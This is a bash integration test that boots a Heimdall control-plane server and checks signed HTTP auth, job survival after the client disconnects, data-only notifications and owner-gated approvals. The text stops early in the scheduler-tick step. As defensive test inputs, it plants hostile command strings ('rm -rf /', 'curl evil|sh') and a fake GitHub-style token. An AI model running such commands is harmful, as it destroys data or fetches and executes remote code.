#!/usr/bin/env bash
# cp-wired.test.sh — THE WIRED CONTROL-PLANE GATE (wave-2, the ASSEMBLY proof).
#
# DESIGN DOSSIER §10 (the registration seam) + §1/§2/§3/§4/§6/§7/§8/§9. Companion to
# cp-integration.test.sh — and a deliberate UPGRADE of it. cp-integration proved the
# pieces individually and drove only POST /dispatch over real HTTP; the rest it drove
# via in-process lib calls. THAT is a partially-hollow gate: it never proved the SEAM
# wiring (cp_boot.boot) actually exposes /jobs, /notifications, /schedules, /approvals
# over the AUTHENTICATED wire.
#
# THIS gate starts ONE assembled control-plane server — the REAL `heimdall-control-plane
# serve` subprocess (cp_boot.boot() -> 15 seam routes + resume_orphans + per-minute tick)
# — and drives the COMPLETE flow over real, SIGNED HTTP. No direct lib call carries the
# flow itself; every step is an authenticated request to a live socket.
#
# THE WIRED STORY (each step a signed HTTP request to the live server):
#   1. BOOT the wired server on an ephemeral port + home; register a signing HAID via
#      the REAL `heimdall-control-plane identity` auth path.
#   2. CLIENT STARTS a job over POST /jobs (signed) -> the handler RETURNS the job_id
#      IMMEDIATELY (non-blocking; the worker-detach holds over HTTP — small latency).
#   3. CLIENT DISCONNECTS (the client process is KILLED) -> a FRESH signed process
#      queries GET /jobs and reads state=done. THE FLIGHT FIX over the wired server.
#   4. The completed job's owner ping surfaces over GET /notifications (signed),
#      DATA-only (no command field — the inverse-of-RCE at the wired read surface).
#   5. A gated action over POST /approvals: a NON-owner approve is REJECTED (403), the
#      OWNER approve SUCCEEDS (200 + dispatched), the decision is AUDITED.
#   6. CARDINALS (falsifiable): unsigned / forged / unknown-HAID -> 401; a smuggled
#      command -> 422 + audit dispatch_refused; a seam route that pre-boot 404s now
#      200s post-boot (the boot wiring is LOAD-BEARING — comment out boot, this reds).
#   7. The SCHEDULER TICK driver is LIVE: a schedule due now (POST /schedules, signed)
#      FIRES autonomously within one (shortened) tick interval -> its dispatch lands in
#      the audit log. The clock turns without a manual client.
#
# DISCIPLINE: isolated throwaway HOME + ephemeral Ed25519 keys; the planted secret is
# RUNTIME-ASSEMBLED (never a static literal — heimdall-fixture-secret-convention.md);
# no live network (notify uses no connectors, the inbox is a local data file); the
# server subprocess + any tick thread are REAPED on EXIT; the tree is clean after.
# Exit 0 = every proof holds over the authenticated wire.

set -uo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$SELF_DIR/.." && pwd)"
LIB="$REPO/bin/lib"
CLI="$REPO/bin/heimdall-control-plane"

for f in cp_server.py cp_boot.py cp_auth.py cp_audit.py cp_allowlist.py cp_handlers.py \
         cp_jobstore.py cp_worker.py cp_approval.py cp_notify.py cp_ingest.py \
         cp_scheduler.py cp_dashboard.py; do
  [ -f "$LIB/$f" ] || { echo "FATAL: $LIB/$f missing (wired server not assembled)" >&2; exit 2; }
done
[ -x "$CLI" ] || { echo "FATAL: $CLI not executable" >&2; exit 2; }

PY="$(command -v python3 || command -v python || true)"
[ -n "$PY" ] || { echo "FATAL: python not found" >&2; exit 2; }

PASS=0
FAIL=0
ok()  { PASS=$((PASS+1)); printf "  \033[32mPASS\033[0m %s\n" "$1"; }
bad() { FAIL=$((FAIL+1)); printf "  \033[31mFAIL\033[0m %s\n" "$1"; }

WORK="$(mktemp -d -t "cp-wired.$(printf 'X%.0s' 1 2 3 4 5 6)")"
SERVER_PID=""
cleanup() {
  [ -n "$SERVER_PID" ] && kill "$SERVER_PID" 2>/dev/null || true
  # reap any stray python children of this script (the in-process tick harness exits
  # on its own; this is belt-and-suspenders so no clock outlives the run).
  rm -rf "$WORK"
}
trap cleanup EXIT

export HEIMDALL_HOME="$WORK/cphome"
export LIB
export WORK
mkdir -p "$HEIMDALL_HOME"
CP_HOME="$HEIMDALL_HOME/control-plane"

# A RUNTIME-ASSEMBLED secret (never a static literal — the fixture-secret convention).
# Individually non-matching fragments; only their concatenation forms a gitleaks-shaped
# token at run time. Proves the stores never persist a secret (assertion in the footer).
_GP_PRE="ghp_"
_GP_A="$(printf 'a%.0s' $(seq 1 20))"
_GP_B="$(printf 'B%.0s' $(seq 1 16))"
PLANTED_SECRET="${_GP_PRE}${_GP_A}${_GP_B}"
export PLANTED_SECRET

# ── THE REUSED HAID-SIGNING HELPER (emitted once; the client + the negative-control
#    harnesses import it). It signs the cp_auth canonical message (METHOD\nPATH\nBODY)
#    and drives a REAL urllib request to the live socket. This is the ONE signer — no
#    step re-invents it (the §3 sign-then-send path, exactly as a real instance uses).
SIGN_HELPER="$WORK/wired_client.py"
cat >"$SIGN_HELPER" <<'PYEOF'
"""wired_client.py — the reused HAID-signing HTTP client for the wired CP gate.

Reuses cp_auth.canonical_message + cp_auth.sign (the REAL §3 sign path) and drives a
stdlib urllib request to the live server socket. Every flow step signs through HERE — no
step hand-rolls a second signer. Reads the instance private seed + base URL from the
environment so the bash harness can spawn it as a short-lived client process (a process
the gate can KILL to prove the flight fix over the wire)."""
import json
import os
import sys
import time
import urllib.error
import urllib.request

sys.path.insert(0, os.environ["LIB"])
import cp_auth as K  # noqa: E402 — the real signer; we never re-implement signing.


def _base():
    return "http://127.0.0.1:%d" % int(os.environ["CP_PORT"])


def request(method, path, body=b"", *, haid=None, priv=None,
            sign=True, bad_sig=False, omit_sig=False, timeout=8):
    """Sign (METHOD\\nPATH\\nBODY) with `priv` for `haid` and drive a real request.

    bad_sig  -> sign DIFFERENT bytes (a forgery: a valid sig over the wrong message).
    omit_sig -> send NO signature header (an unsigned request).
    sign=False is an alias for omit_sig (kept for call-site clarity).
    Returns (status, parsed_body_dict)."""
    haid = haid or os.environ["CP_HAID"]
    priv = priv or os.environ["CP_PRIV"]
    if isinstance(body, str):
        body = body.encode("utf-8")
    url = _base() + path
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("X-Heimdall-HAID", haid)
    req.add_header("Content-Type", "application/json")
    if sign and not omit_sig:
        if bad_sig:
            msg = K.canonical_message(method, path, b'{"forged":"other-bytes"}')
        else:
            msg = K.canonical_message(method, path, body)
        req.add_header("X-Heimdall-Signature", K.sign(priv, msg))
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            return resp.status, (json.loads(raw) if raw else {})
    except urllib.error.HTTPError as exc:
        raw = exc.read()
        try:
            return exc.code, (json.loads(raw) if raw else {})
        except (ValueError, TypeError):
            return exc.code, {}


def main(argv):
    """CLI surface for the bash harness: `wired_client.py <verb> ...` -> JSON on stdout.

    Verbs:
      start <action_type> <task_id>          POST /jobs (signed) -> {status, latency, job_id, state}
      status <job_id>                         GET /jobs {job_id in body} -> {status, state, result}
      notifications                           GET /notifications -> {status, count, kinds, executes_any}
      approvals-pending                       GET /approvals/pending -> {status, count}
      approve <action_id>                     POST /approvals/approve -> {status, dispatched}
      raw <method> <path> [body]              a raw signed request -> {status, body}
      unsigned <method> <path>                an UNSIGNED request -> {status}
      forged <method> <path> [body]           a FORGED-signature request -> {status}
      unknown-haid <method> <path>            a signed request as an UNREGISTERED haid -> {status}
    """
    verb = argv[0]
    if verb == "start":
        action_type, task_id = argv[1], argv[2]
        body = json.dumps({"action_type": action_type,
                           "params": {"task_id": task_id}}).encode()
        t0 = time.time()
        st, b = request("POST", "/jobs", body)
        dt = time.time() - t0
        out = {"status": st, "latency": round(dt, 4),
               "job_id": b.get("job_id"), "state": b.get("state")}
    elif verb == "status":
        body = json.dumps({"job_id": argv[1]}).encode()
        st, b = request("GET", "/jobs", body)
        job = b.get("job") or {}
        result = job.get("result")
        out = {"status": st, "state": job.get("state"),
               "result": (result.get("status") if isinstance(result, dict) else result)}
    elif verb == "notifications":
        st, b = request("GET", "/notifications", b"")
        ns = b.get("notifications") or []
        forbidden = {"cmd", "command", "exec", "dispatch", "handler", "shell",
                     "eval", "run", "action_type"}
        out = {
            "status": st,
            "count": len(ns),
            "kinds": [n.get("kind") for n in ns],
            "has_command_key": any(set(n.keys()) & forbidden for n in ns),
        }
    elif verb == "approvals-pending":
        st, b = request("GET", "/approvals/pending", b"")
        out = {"status": st, "count": len(b.get("pending") or [])}
    elif verb == "approve":
        body = json.dumps({"action_id": argv[1]}).encode()
        st, b = request("POST", "/approvals/approve", body)
        out = {"status": st, "dispatched": b.get("dispatched"),
               "reason": b.get("reason")}
    elif verb == "raw":
        method, path = argv[1], argv[2]
        body = argv[3].encode() if len(argv) > 3 else b""
        st, b = request(method, path, body)
        out = {"status": st, "body": b}
    elif verb == "unsigned":
        st, b = request(argv[1], argv[2], b"", omit_sig=True)
        out = {"status": st}
    elif verb == "forged":
        body = argv[3].encode() if len(argv) > 3 else b""
        st, b = request(argv[1], argv[2], body, bad_sig=True)
        out = {"status": st}
    elif verb == "unknown-haid":
        st, b = request(argv[1], argv[2], b"", haid="haid:nobody.unregistered")
        out = {"status": st}
    else:
        out = {"error": "unknown verb: %s" % verb}
    sys.stdout.write(json.dumps(out))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
PYEOF

jget() { "$PY" -c "import json,sys; print(json.load(sys.stdin).get('$1'))"; }

echo "============================================================"
echo "WIRED CONTROL-PLANE GATE (§10 assembly over signed HTTP)"
echo "  home=$HEIMDALL_HOME"
echo "============================================================"

# ──────────────────────────────────────────────────────────────────────────────
# #1 BOOT the wired server + register a signing identity over the REAL auth path.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#1 BOOT the assembled server + register a signing HAID (§3/§10)"

# crypto gate: the wired gate REQUIRES PKI (signed HTTP). Absent crypto -> SKIP cleanly
# (the cp-integration gate already proves graceful crypto-unavailable degrade).
if ! "$PY" -c "import sys,os; sys.path.insert(0,os.environ['LIB']); import cp_auth; sys.exit(0 if cp_auth.crypto_available() else 1)"; then
  echo "  SKIP no crypto backend (cryptography|pynacl) — the wired signed-HTTP gate needs PKI."
  echo "  (cp-integration covers the graceful crypto-unavailable degrade path.)"
  echo
  echo "============================================================"
  printf "cp-wired: %d passed, %d failed (SKIPPED — no crypto)\n" "$PASS" "$FAIL"
  echo "============================================================"
  exit 0
fi

OWNER_HAID="haid:rj.owner"
"$CLI" identity --haid "$OWNER_HAID" --owner --home "$HEIMDALL_HOME" \
  >"$WORK/ident.json" 2>"$WORK/ident.err"
IDENT_OK="$("$PY" -c "import json;print(json.load(open('$WORK/ident.json')).get('ok'))" 2>/dev/null)"
[ "$IDENT_OK" = "True" ] \
  && ok "#1 owner identity registered via the REAL CLI auth path ($OWNER_HAID)" \
  || { bad "#1 CLI identity registration failed"; cat "$WORK/ident.err" >&2; }

# also register a NON-owner instance HAID (used by the approval-rejection cardinal).
DEV_HAID="haid:dev.laptop"
"$CLI" identity --haid "$DEV_HAID" --home "$HEIMDALL_HOME" \
  >"$WORK/ident_dev.json" 2>"$WORK/ident_dev.err"
DEV_OK="$("$PY" -c "import json;print(json.load(open('$WORK/ident_dev.json')).get('ok'))" 2>/dev/null)"
[ "$DEV_OK" = "True" ] \
  && ok "#1 non-owner instance identity registered ($DEV_HAID)" \
  || bad "#1 non-owner identity registration failed"

OWNER_PRIV="$("$PY" -c "import json;print(json.load(open('$WORK/ident.json'))['private_key'])")"
DEV_PRIV="$("$PY" -c "import json;print(json.load(open('$WORK/ident_dev.json'))['private_key'])")"

# pick a free ephemeral port for the live server.
CP_PORT="$("$PY" -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()')"
export CP_PORT CP_HAID="$OWNER_HAID" CP_PRIV="$OWNER_PRIV"

# START the REAL assembled server as a subprocess (cp_boot.boot() runs inside serve()).
# --no-revocation exercises PURE PKI (no agents.json CLI dependency; the documented flag).
HMD_CP_GUARD_PID=$$ "$CLI" serve --host 127.0.0.1 --port "$CP_PORT" --home "$HEIMDALL_HOME" --no-revocation \
  >"$WORK/serve.out" 2>"$WORK/serve.err" &
SERVER_PID=$!

# wait for the socket to accept (bounded; fail loud if it never comes up).
UP=""
for _ in $(seq 1 50); do
  if "$PY" -c "import socket,sys; s=socket.socket(); s.settimeout(0.2)
try:
    s.connect(('127.0.0.1', $CP_PORT)); s.close()
except OSError:
    sys.exit(1)" 2>/dev/null; then UP="1"; break; fi
  sleep 0.1
done
if [ -n "$UP" ] && kill -0 "$SERVER_PID" 2>/dev/null; then
  ok "#1 the REAL wired server (heimdall-control-plane serve) is live on 127.0.0.1:$CP_PORT (pid $SERVER_PID)"
else
  bad "#1 the wired server did not come up"
  cat "$WORK/serve.err" >&2
fi

# the boot wiring exposes 15 seam routes (the §10 assembly surface). Routes register
# per-PROCESS in memory, so we count them in a process that runs the SAME cp_boot.boot()
# the live server ran — proving boot() (not cp_server alone) yields the full surface. The
# over-the-wire half is proven in #6 (a signed seam route 200s only because boot wired it).
ROUTE_COUNT="$(LIB="$LIB" "$PY" - <<'PYEOF'
import os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_server, cp_boot
cp_boot.boot(home=os.environ["HEIMDALL_HOME"], start_tick=False, resume=False)
print(len(cp_server.registered_routes()))
PYEOF
)"
[ "${ROUTE_COUNT:-0}" -ge 15 ] \
  && ok "#1 cp_boot.boot wires the full seam surface ($ROUTE_COUNT registered routes, expect >=15)" \
  || bad "#1 the seam surface is not fully wired (only $ROUTE_COUNT routes)"

# ──────────────────────────────────────────────────────────────────────────────
# #2 CLIENT STARTS a job over POST /jobs (signed) — the handler RETURNS the job_id
#    IMMEDIATELY (non-blocking; the worker-detach holds over HTTP, small latency).
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#2 CLIENT STARTS a job over POST /jobs (signed, NON-blocking, §4)"

"$PY" "$SIGN_HELPER" start run-task-X wired-flight-job >"$WORK/start.out" 2>"$WORK/start.err"
START_STATUS="$(jget status <"$WORK/start.out")"
JOB_ID="$(jget job_id <"$WORK/start.out")"
START_LATENCY="$(jget latency <"$WORK/start.out")"
START_STATE="$(jget state <"$WORK/start.out")"

[ "$START_STATUS" = "200" ] && [ -n "$JOB_ID" ] && [ "$JOB_ID" != "None" ] \
  && ok "#2 POST /jobs (signed) returned the job_id IMMEDIATELY ($JOB_ID)" \
  || { bad "#2 POST /jobs did not return a job_id (status $START_STATUS)"; cat "$WORK/start.err" >&2; }

# NON-BLOCKING: the handler returns the job_id without the client blocking on the run.
# Bound the response latency — a handler that blocked on the whole job (or opened a
# reverse channel to the client) would not return in a fraction of a second.
LATENCY_OK="$("$PY" -c "print('yes' if float('${START_LATENCY:-99}') < 1.0 else 'no')" 2>/dev/null)"
[ "$LATENCY_OK" = "yes" ] \
  && ok "#2 the start handler is NON-blocking (returned in ${START_LATENCY}s — the worker-detach holds over HTTP)" \
  || bad "#2 the start handler blocked (latency ${START_LATENCY}s)"
[ "$START_STATE" = "queued" ] \
  && ok "#2 the response reports the job ENQUEUED (state=queued) — a durable record the client can leave" \
  || bad "#2 the start response did not report an enqueued job (state=$START_STATE)"

# ──────────────────────────────────────────────────────────────────────────────
# #3 CLIENT DISCONNECTS (the client process is KILLED) -> a FRESH signed process
#    queries GET /jobs and reads state=done. THE FLIGHT FIX over the WIRED server —
#    not a harness Popen: the job ran server-side off the durable record, parented to
#    the server, while the starting client was gone.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#3 CLIENT DISCONNECTS -> a FRESH signed query reads state=done [CARDINAL: THE FLIGHT FIX]"

# Prove the disconnect is REAL: spawn a client process that starts a job and then SLEEPS
# (holding nothing the job needs), then KILL it. The job must still complete server-side.
cat >"$WORK/disconnect_client.py" <<'PYEOF'
import os, sys, time
sys.path.insert(0, os.environ["WORK"])
import wired_client as C
body = '{"action_type": "run-task-X", "params": {"task_id": "wired-disconnect-job"}}'
st, b = C.request("POST", "/jobs", body)
# announce the job_id to the parent, then BLOCK forever — the parent KILLS this process
# (a hard client disconnect). The server-side job must survive this death.
sys.stdout.write((b.get("job_id") or "") + "\n")
sys.stdout.flush()
time.sleep(120)
PYEOF
"$PY" "$WORK/disconnect_client.py" >"$WORK/disconnect.out" 2>"$WORK/disconnect.err" &
DISC_PID=$!
# read the job_id the client emitted, then KILL the client (the disconnect event).
DISC_JOB=""
for _ in $(seq 1 50); do
  DISC_JOB="$(head -n1 "$WORK/disconnect.out" 2>/dev/null)"
  [ -n "$DISC_JOB" ] && break
  sleep 0.1
done
kill -9 "$DISC_PID" 2>/dev/null || true
wait "$DISC_PID" 2>/dev/null || true
CLIENT_DEAD="no"; kill -0 "$DISC_PID" 2>/dev/null || CLIENT_DEAD="yes"
[ -n "$DISC_JOB" ] && [ "$CLIENT_DEAD" = "yes" ] \
  && ok "#3 the client started a job ($DISC_JOB) then was KILLED (a real disconnect)" \
  || bad "#3 could not establish a real client disconnect"

# a FRESH process (this is a brand-new signed client — no shared state with the dead one)
# polls GET /jobs until the job reaches a terminal state. It reads done -> the job ran
# server-side AFTER its starting client died.
FINAL_STATE="" RESULT_STATUS=""
for _ in $(seq 1 80); do
  "$PY" "$SIGN_HELPER" status "$DISC_JOB" >"$WORK/poll.out" 2>"$WORK/poll.err"
  FINAL_STATE="$(jget state <"$WORK/poll.out")"
  RESULT_STATUS="$(jget result <"$WORK/poll.out")"
  [ "$FINAL_STATE" = "done" ] || [ "$FINAL_STATE" = "cancelled" ] && break
  sleep 0.1
done
[ "$FINAL_STATE" = "done" ] \
  && ok "#3 a FRESH signed GET /jobs reads state=done (the job survived the client's death over the wire)" \
  || bad "#3 the disconnected job did NOT reach done (got '$FINAL_STATE') — it died with the client"
[ "$RESULT_STATUS" = "prepared" ] \
  && ok "#3 the reconnecting client reads the job RESULT (status=prepared) over signed HTTP" \
  || bad "#3 the result was not surfaced to the reconnecting client (got '$RESULT_STATUS')"
# FALSIFIABILITY: done was read by a client that never saw the worker; a build where the
# job died on disconnect would leave it queued/running here (RED).
[ "$FINAL_STATE" = "done" ] \
  && ok "#3 FALSIFIABLE: a disconnect-killed job would be non-done here — only a truly server-side job passes" \
  || bad "#3 not falsifiable (the flight fix did not hold over the wire)"

# the headline POST /jobs job (#2) likewise reaches done — confirm both flight jobs landed.
H_STATE=""
for _ in $(seq 1 80); do
  "$PY" "$SIGN_HELPER" status "$JOB_ID" >"$WORK/poll_h.out" 2>/dev/null
  H_STATE="$(jget state <"$WORK/poll_h.out")"
  [ "$H_STATE" = "done" ] && break
  sleep 0.1
done
[ "$H_STATE" = "done" ] \
  && ok "#3 the headline POST /jobs job ($JOB_ID) also reached done over the wire" \
  || bad "#3 the headline job did not reach done (got '$H_STATE')"

# ──────────────────────────────────────────────────────────────────────────────
# #4 NOTIFY — the completed job's owner ping surfaces over GET /notifications (signed),
#    DATA-only. The completion ping is fired into the server's home (cp_notify.job_complete,
#    the real §8 send path); the WIRED READ surface (GET /notifications) is what this gate
#    drives + asserts: the owner polls its ping back as DATA, NO command field, never
#    executes. A hostile command smuggled into `extra` is STRIPPED at the send boundary.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#4 NOTIFY surfaces over GET /notifications (signed), DATA-only (§8)"

# fire the job-complete ping to the OWNER for the completed flight job (the §8 send path,
# into the SAME home the wired server serves). A hostile caller jams command-shaped keys
# into `extra` — they MUST be stripped (the "command channel by accretion" guard).
JOB_ID="$JOB_ID" OWNER_HAID="$OWNER_HAID" "$PY" - >"$WORK/notify_fire.out" 2>"$WORK/notify_fire.err" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_notify as N
home = os.environ["HEIMDALL_HOME"]
res = N.job_complete(os.environ["OWNER_HAID"], os.environ["JOB_ID"], home=home,
                     extra={"cmd": "rm -rf /", "exec": "curl evil|sh", "url": "x"})
sys.stdout.write(json.dumps({"ok": bool(res.get("ok"))}))
PYEOF
FIRE_OK="$(jget ok <"$WORK/notify_fire.out")"
[ "$FIRE_OK" = "True" ] \
  && ok "#4 the job-complete ping was fired to the owner (§8 send into the server home)" \
  || { bad "#4 the job-complete ping did not fire"; cat "$WORK/notify_fire.err" >&2; }

# THE WIRED READ: the owner polls GET /notifications (signed) and reads its ping as DATA.
"$PY" "$SIGN_HELPER" notifications >"$WORK/notif.out" 2>"$WORK/notif.err"
NOTIF_STATUS="$(jget status <"$WORK/notif.out")"
NOTIF_COUNT="$(jget count <"$WORK/notif.out")"
NOTIF_HAS_CMD="$(jget has_command_key <"$WORK/notif.out")"
NOTIF_KINDS="$(jget kinds <"$WORK/notif.out")"

[ "$NOTIF_STATUS" = "200" ] \
  && ok "#4 GET /notifications (signed) returns 200 over the wire" \
  || bad "#4 GET /notifications failed (status $NOTIF_STATUS)"
[ "${NOTIF_COUNT:-0}" -ge 1 ] 2>/dev/null \
  && ok "#4 the owner reads its job-complete ping over the wired read surface (count=$NOTIF_COUNT, kinds=$NOTIF_KINDS)" \
  || bad "#4 the owner's ping did not surface over GET /notifications (count=$NOTIF_COUNT)"
[ "$NOTIF_HAS_CMD" = "False" ] \
  && ok "#4 the notification is DATA-only — NO command/executable field over the wire (inverse-of-RCE)" \
  || bad "#4 a command field leaked into a wired notification"

# ──────────────────────────────────────────────────────────────────────────────
# #5 OWNER-GATED ACTION over POST /approvals — a gated action surfaces to the owner;
#    a NON-owner approve is REJECTED (403); the OWNER approve SUCCEEDS (200 +
#    dispatched); the decision is AUDITED. All over signed HTTP.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#5 OWNER-GATED ACTION over POST /approvals (non-owner rejected; owner approves; audited, §7)"

# A gated action ENTERS the approval queue via cp_approval.submit (the §7 enqueue path).
# We seed ONE pending gate into the server's home (the real submit, into the same store
# the wired /approvals routes serve); the OWNER DECISION below is then driven entirely
# over signed HTTP — the wired half this gate proves. (POST /dispatch's gate-hold audits
# + 422s but does not enqueue; the queue is fed by submit, per §7.)
OWNER_HAID="$OWNER_HAID" "$PY" - >"$WORK/gate_submit.out" 2>"$WORK/gate_submit.err" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_approval as Ap
import cp_auth as K
home = os.environ["HEIMDALL_HOME"]
owner = K.Identity(os.environ["OWNER_HAID"], owner=True)
sub = Ap.submit(owner, "run-suite", {"suite": "integration"}, home=home)
sys.stdout.write(json.dumps({"action_id": sub.get("action_id"),
                             "state": sub.get("state"),
                             "dispatched": sub.get("dispatched")}))
PYEOF
GATE_ACTION_ID="$(jget action_id <"$WORK/gate_submit.out")"
GATE_STATE="$(jget state <"$WORK/gate_submit.out")"
GATE_DISPATCHED="$(jget dispatched <"$WORK/gate_submit.out")"
[ "$GATE_STATE" = "pending" ] && [ "$GATE_DISPATCHED" = "False" ] && [ -n "$GATE_ACTION_ID" ] && [ "$GATE_ACTION_ID" != "None" ] \
  && ok "#5 a gated action (run-suite) does NOT dispatch -> enters pending, surfaces action_id ($GATE_ACTION_ID)" \
  || { bad "#5 the gated action did not enter the pending queue (state $GATE_STATE, dispatched $GATE_DISPATCHED)"; cat "$WORK/gate_submit.err" >&2; }

# the approval queue surfaces it over signed GET /approvals/pending.
"$PY" "$SIGN_HELPER" approvals-pending >"$WORK/pending.out" 2>"$WORK/pending.err"
PENDING_STATUS="$(jget status <"$WORK/pending.out")"
PENDING_COUNT="$(jget count <"$WORK/pending.out")"
[ "$PENDING_STATUS" = "200" ] && [ "${PENDING_COUNT:-0}" -ge 1 ] 2>/dev/null \
  && ok "#5 GET /approvals/pending (signed) surfaces the queued gate (count=$PENDING_COUNT)" \
  || bad "#5 the gate did not surface in the pending queue (status $PENDING_STATUS, count $PENDING_COUNT)"

# a NON-owner approve over POST /approvals/approve (signed as the dev HAID) -> 403.
CP_HAID="$DEV_HAID" CP_PRIV="$DEV_PRIV" "$PY" "$SIGN_HELPER" approve "$GATE_ACTION_ID" \
  >"$WORK/nonowner.out" 2>"$WORK/nonowner.err"
NONOWNER_STATUS="$(jget status <"$WORK/nonowner.out")"
[ "$NONOWNER_STATUS" = "403" ] \
  && ok "#5 a NON-owner approve is REJECTED over the wire (403)" \
  || bad "#5 a non-owner approve was not rejected (status $NONOWNER_STATUS)"

# the OWNER approve over POST /approvals/approve (signed as the owner) -> 200 + dispatched.
"$PY" "$SIGN_HELPER" approve "$GATE_ACTION_ID" >"$WORK/owner.out" 2>"$WORK/owner.err"
OWNER_STATUS="$(jget status <"$WORK/owner.out")"
OWNER_DISPATCHED="$(jget dispatched <"$WORK/owner.out")"
[ "$OWNER_STATUS" = "200" ] && [ "$OWNER_DISPATCHED" = "True" ] \
  && ok "#5 the OWNER approve SUCCEEDS over the wire (200 + dispatched)" \
  || { bad "#5 the owner approve did not dispatch (status $OWNER_STATUS, dispatched $OWNER_DISPATCHED)"; cat "$WORK/owner.err" >&2; }

# the decision is AUDITED (the approval row is in the audit log, via the real CLI export).
APPROVAL_ROWS="$("$CLI" audit --event approval --home "$HEIMDALL_HOME" 2>/dev/null | grep -c '"event": "approval"' || true)"
[ "${APPROVAL_ROWS:-0}" -ge 1 ] \
  && ok "#5 the owner approval is AUDITED (the CLI audit log carries the approval row)" \
  || bad "#5 the owner approval was not audited ($APPROVAL_ROWS rows)"

# ──────────────────────────────────────────────────────────────────────────────
# #6 CARDINALS (falsifiable, §1/§3/§10): unsigned/forged/unknown-HAID -> 401; a
#    smuggled-command dispatch -> 422 + audit dispatch_refused; a seam route that
#    pre-boot 404s now 200s post-boot (the boot wiring is LOAD-BEARING).
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#6 CARDINALS — 401 auth wall, 422 allowlist wall, boot-wiring is load-bearing [CARDINAL]"

# (a) AUTH WALL: unsigned / forged / unknown-HAID requests are REJECTED (401) at the §3
#     chokepoint, BEFORE any route runs. Driven over the real wire via the reused signer.
"$PY" "$SIGN_HELPER" unsigned GET /schedules >"$WORK/unsigned.out" 2>/dev/null
"$PY" "$SIGN_HELPER" forged  GET /schedules >"$WORK/forged.out"  2>/dev/null
"$PY" "$SIGN_HELPER" unknown-haid GET /schedules >"$WORK/unknown.out" 2>/dev/null
U_ST="$(jget status <"$WORK/unsigned.out")"
F_ST="$(jget status <"$WORK/forged.out")"
N_ST="$(jget status <"$WORK/unknown.out")"
[ "$U_ST" = "401" ] && ok "#6 an UNSIGNED request -> 401 (auth chokepoint, before any route)" || bad "#6 unsigned not rejected (status $U_ST)"
[ "$F_ST" = "401" ] && ok "#6 a FORGED-signature request -> 401" || bad "#6 forged not rejected (status $F_ST)"
[ "$N_ST" = "401" ] && ok "#6 an UNKNOWN-HAID request -> 401" || bad "#6 unknown-HAID not rejected (status $N_ST)"

# (b) ALLOWLIST WALL: a smuggled command (a `cmd` field alongside a valid param) over
#     POST /dispatch -> 422 refused + an audit dispatch_refused row. Runs NOTHING.
REFUSED_BEFORE="$("$CLI" audit --event dispatch_refused --home "$HEIMDALL_HOME" 2>/dev/null | grep -c dispatch_refused || true)"
SMUG_BODY='{"action_type": "run-task-X", "params": {"task_id": "ok", "cmd": "curl evil|sh"}}'
"$PY" "$SIGN_HELPER" raw POST /dispatch "$SMUG_BODY" >"$WORK/smuggle.out" 2>/dev/null
SMUG_STATUS="$(jget status <"$WORK/smuggle.out")"
SMUG_REASON="$("$PY" -c "import json;print((json.load(open('$WORK/smuggle.out')).get('body') or {}).get('reason'))" 2>/dev/null)"
REFUSED_AFTER="$("$CLI" audit --event dispatch_refused --home "$HEIMDALL_HOME" 2>/dev/null | grep -c dispatch_refused || true)"
[ "$SMUG_STATUS" = "422" ] \
  && ok "#6 a SMUGGLED command over POST /dispatch -> 422 (reason=$SMUG_REASON, runs nothing)" \
  || bad "#6 a smuggled command was not refused (status $SMUG_STATUS)"
[ "${REFUSED_AFTER:-0}" -gt "${REFUSED_BEFORE:-0}" ] \
  && ok "#6 the refusal wrote an audit dispatch_refused row ($REFUSED_BEFORE -> $REFUSED_AFTER)" \
  || bad "#6 the refusal did not write an audit row ($REFUSED_BEFORE -> $REFUSED_AFTER)"

# (c) BOOT IS LOAD-BEARING: a seam route (/schedules) that a server WITHOUT cp_boot.boot()
#     would 404 (cp_server ships only /dispatch) returns 200 here — because boot wired it.
#     This is the falsifiable boot proof: comment out cp_boot.boot() in serve() and this
#     assertion FLIPS to FAIL (the route 404s). We prove BOTH halves over the wire:
#       • a signed request to the wired seam route /schedules -> 200 (boot wired it).
#       • a signed request to a NON-registered path /nope -> 404 (auth passed, no route),
#         proving the 200 above is the ROUTE, not a blanket accept.
"$PY" "$SIGN_HELPER" raw GET /schedules >"$WORK/sched_get.out" 2>/dev/null
SCHED_GET_STATUS="$(jget status <"$WORK/sched_get.out")"
"$PY" "$SIGN_HELPER" raw GET /nope >"$WORK/nope.out" 2>/dev/null
NOPE_STATUS="$(jget status <"$WORK/nope.out")"
[ "$SCHED_GET_STATUS" = "200" ] \
  && ok "#6 a signed seam route (GET /schedules) -> 200 — BOOT WIRED IT (pre-boot this 404s) [load-bearing]" \
  || bad "#6 the seam route did not respond 200 (status $SCHED_GET_STATUS) — boot wiring may be broken"
[ "$NOPE_STATUS" = "404" ] \
  && ok "#6 a signed NON-route (GET /nope) -> 404 (auth passed, no route) — the 200 above is the ROUTE, not a blanket accept" \
  || bad "#6 a non-route did not 404 (status $NOPE_STATUS)"

# ──────────────────────────────────────────────────────────────────────────────
# #7 SCHEDULER TICK IS LIVE — a schedule due now (POST /schedules, signed) FIRES
#    autonomously within one (shortened) tick interval; its dispatch lands in the audit
#    log. The wired serve() starts a per-MINUTE clock; to prove the driver deterministically
#    we boot an in-process server with a SHORTENED tick interval (the start_tick_thread
#    `interval` knob the code exposes), create a due schedule over signed HTTP, wait one
#    interval, and assert the autonomous dispatch is audited — the clock turned with NO
#    manual client. This exercises the SAME cp_boot driver, only faster.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#7 SCHEDULER TICK driver is LIVE (a due schedule FIRES autonomously, §6)"

TICK_OUT="$WORK/tick.out"
